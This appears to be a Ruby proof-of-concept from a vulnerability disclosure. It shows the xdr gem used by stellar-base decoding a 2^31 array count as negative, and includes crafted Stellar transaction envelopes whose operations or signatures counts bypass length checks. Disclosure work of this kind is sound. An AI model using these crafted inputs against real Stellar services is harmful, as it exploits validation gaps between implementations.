# C1: the xdr gem (3.0.3, used by stellar-base 0.32.0) reads a variable-length
# array count as a signed 32-bit int. A count of 2^31 or more becomes negative,
# passes the "length > max" check, and decodes as an empty array.
#   ruby c1_vararray_negative_count.rb   (gem stellar-base 0.32.0 installed)
require "stellar-base"

puts "stellar-base #{Gem.loaded_specs["stellar-base"].version}, xdr #{Gem.loaded_specs["xdr"].version}"

# 1. The bare xdr gem: count 0x80000000, max 20, no elements follow.
p XDR::VarArray[XDR::Int, 20].from_xdr("\x80\x00\x00\x00".b)

# 2. A real pubnet envelope (ledger 40000001, tx 4adfa3a9...) with the
#    operations<100> count set to 0x80000000 and the one operation removed.
#    stellar-core 30.0.0 print-xdr: "xvector overflow". rs-stellar-xdr 30.0.0:
#    "xdr value max length exceeded". go-stellar-sdk: "data size (2147483648)
#    exceeds size limit (100)".
B64 = "AAAAAgAAAABSTh04F5yGRuzDsfhzZtQUhnLaHgY4Bf9HZXhQw+kkTwADDUABIfX+AAmFkwAAAAAAAAABAAAABTEwNDk4AAAAgAAAAAAAAAAAAAABw+kkTwAAAEB3D1mhdKqqIGQQTvIQLolGTKX5RVwtvTGas+ajdcSq230TY3Qde0xkeTz2iJ1poGBx5wcayK5i3lOqdEfMB28A"
raw = Base64.strict_decode64(B64)
env = Stellar::TransactionEnvelope.from_xdr(raw)
puts "decoded: operations=#{env.tx.operations.length} signatures=#{env.signatures.length}"
back = env.to_xdr
puts "re-encodes to the same bytes: #{back == raw}"
puts "re-encoded: #{Base64.strict_encode64(back)}"
Stellar.on_network(Stellar::Networks::PUBLIC) { puts "tx hash: #{env.tx.hash.unpack1("H*")}" }

# 3. Same base envelope with the signatures<20> count set to 0x80000000 and
#    the one signature removed: decodes with no signatures, hash unchanged.
B64S = "AAAAAgAAAABSTh04F5yGRuzDsfhzZtQUhnLaHgY4Bf9HZXhQw+kkTwADDUABIfX+AAmFkwAAAAAAAAABAAAABTEwNDk4AAAAAAAAAQAAAAEAAAAAYSd9wNMUgqCI7bmo8/YYUMD8Tgt5AWP+LEM7SThIB7kAAAABAAAAAOXDqt/kCw0khZz7brrwCR79i8j1W5kyVZKR8d8S3vVOAAAAAAAAAAAk8WXAAAAAAIAAAAA="
raw = Base64.strict_decode64(B64S)
env = Stellar::TransactionEnvelope.from_xdr(raw)
puts "decoded: operations=#{env.tx.operations.length} signatures=#{env.signatures.length}"
puts "re-encodes to the same bytes: #{env.to_xdr == raw}"
Stellar.on_network(Stellar::Networks::PUBLIC) { puts "tx hash: #{env.tx.hash.unpack1("H*")}" }
